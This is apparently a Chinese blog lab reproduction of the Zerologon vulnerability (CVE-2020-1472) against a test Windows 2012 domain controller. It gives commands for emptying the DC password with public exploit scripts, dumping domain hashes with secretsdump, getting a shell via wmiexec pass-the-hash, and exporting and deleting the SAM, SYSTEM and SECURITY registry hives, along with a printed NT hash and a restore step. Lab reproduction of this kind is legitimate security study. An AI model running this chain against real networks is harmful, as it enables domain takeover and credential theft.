CVE-2020-1472复现

# <a id="CVE20201472_0"/>CVE-2020-1472复现

## <a id="_1"/>简介

Netlogon使用的AES认证算法中的vi向量默认为0，导致攻击者可以绕过认证，同时其设置域控密码的远程接口也使用了该函数，导致可以将域控中保存在AD中的管理员password设置为空

## <a id="_4"/>复现环境

**DC：**<br/> os：windows 2012 server<br/> ip：192.168.106.137

**攻击机：**<br/> os：kali<br/> ip：192.168.106.129

## <a id="_13"/>影响版本

>  
 Windows Server 2008 R2 for x64-based Systems<br/> Service Pack 1Windows Server 2008 R2 for x64-based<br/> Systems Service Pack 1 (Server Core installation)<br/> Windows Server 2012<br/> Windows Server 2012 (Server Core installation)<br/> Windows Server 2012 R2<br/> Windows Server 2012 R2 (Server Core installation)<br/> Windows Server 2016<br/> Windows Server 2016 (Server Core installation)<br/> Windows Server 2019<br/> Windows Server 2019 (Server Core installation)<br/> Windows Server, version 1903 (Server Core installation)<br/> Windows Server, version 1909 (Server Core installation)<br/> Windows Server, version 2004 (Server Core installation) 


## <a id="_29"/>域环境搭建

关于域环境的搭建，可以参考这篇文章[Windows Server 2012搭建域环境](https://www.cnblogs.com/xfan1982/p/4120583.html)

搭建完毕后，可以使用`Netdom query fsmo`命令查看域环境信息<br/> <img src="https://img-blog.csdnimg.cn/20200921174818345.png#pic_center" alt=""/><br/> 用`nbtstat -n` 获取当前机器的NetBIOS名称<br/> <img src="https://img-blog.csdnimg.cn/20200921174840932.png#pic_center" alt=""/>

## <a id="_37"/>复现过程

### <a id="_38"/>漏洞验证

下载poc：https://github.com/SecuraBV/CVE-2020-1472<br/> 验证漏洞是否存在：<br/> `python3 zerologon_tester.py DC_NETBIOS_NAME DC_IP_ADDR`<br/> 如下图所示，漏洞存在<br/> <img src="https://img-blog.csdnimg.cn/20200921174909802.png#pic_center" alt=""/>

### <a id="_45"/>漏洞利用

下载exp：<br/> `git clone https://github.com/dirkjanm/CVE-2020-1472`

置空DC的密码<br/> `python3 cve-2020-1472-exploit.py DC_NETBIOS_NAME DC_IP_ADDR`<br/> <img src="https://img-blog.csdnimg.cn/20200921174939973.png#pic_center" alt=""/>

>  
 如果出现了下图中的错误：<br/> <img src="https://img-blog.csdnimg.cn/20200921175018741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2ODUzOTcy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"/><br/> 可以参考图中的方式修复<br/> <img src="https://img-blog.csdnimg.cn/20200921175051837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2ODUzOTcy,size_16,color_FFFFFF,t_70#pic_center" alt=""/> 


### <a id="HASH_57"/>获取HASH

使用impacket包中的secretsdum.py来获取相关的HASh<br/> `python3 secretsdump.py DOMAIN/DC_NETBIOS_NAME\$@DC_IP_ADDR -no-pass`<br/> <img src="https://img-blog.csdnimg.cn/20200921175116357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2ODUzOTcy,size_16,color_FFFFFF,t_70#pic_center" alt=""/>

### <a id="shell_63"/>获取shell

获取HASH后，可以利用wmiexec.py登录，从而获取一个SHELL<br/> `python wmiexec.py -hashes &lt;HASH&gt; DOMAIN/DOMAIN_USER@DC_IP_ADDR`<br/> <img src="https://img-blog.csdnimg.cn/20200921175133425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2ODUzOTcy,size_16,color_FFFFFF,t_70#pic_center" alt=""/>

### <a id="HASH_69"/>恢复原HASH

执行以下命令，获取SAM中原来的HASH

```
# SHELL 
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.saveget security.save
del /f system.save
del /f sam.save
del /f security.save
exit

```

<img src="https://img-blog.csdnimg.cn/20200921175153469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2ODUzOTcy,size_16,color_FFFFFF,t_70#pic_center" alt=""/><br/> 保存在kali中<br/> <img src="https://img-blog.csdnimg.cn/202009211752100.png#pic_center" alt=""/>

### <a id="HASH_86"/>解析HASH

执行如下命令，利用secretsdump.py解析保存在本地的nt hash<br/> `python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL`<br/> <img src="https://img-blog.csdnimg.cn/20200921175231533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2ODUzOTcy,size_16,color_FFFFFF,t_70#pic_center" alt=""/><br/> 需要保存的数据<br/> `a5d65e274a2db831ae4b246ec8fe51de`

### <a id="HASH_94"/>恢复HASH

恢复HASH的工具：<br/> git clone https://github.com/risksense/zerologon<br/> 执行命令：<br/> `python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR &lt;ORI_HASH&gt;`<br/> <img src="https://img-blog.csdnimg.cn/20200921175254625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2ODUzOTcy,size_16,color_FFFFFF,t_70#pic_center" alt=""/>

### <a id="_102"/>检查是否恢复

再次执行命令<br/> `python3 secretsdump.py DOMAIN/DC_NETBIOS_NAME\$@DC_IP_ADDR -no-pass`<br/> <img src="https://img-blog.csdnimg.cn/20200921175311651.png#pic_center" alt=""/>

## <a id="_106"/>参考链接
1. [CVE-2020-1472 域内提权完整利用](https://mp.weixin.qq.com/s/RUkGMxM5GjFrEiKa8aH6JA)1. [CVE-2020-1472复现指北](https://my.oschina.net/Umbrel1a/blog/4589778)1. [Windows Server 2012搭建域环境](https://www.cnblogs.com/xfan1982/p/4120583.html)


参考文章地址:https://blog.csdn.net/sinat_36853972/article/details/108715304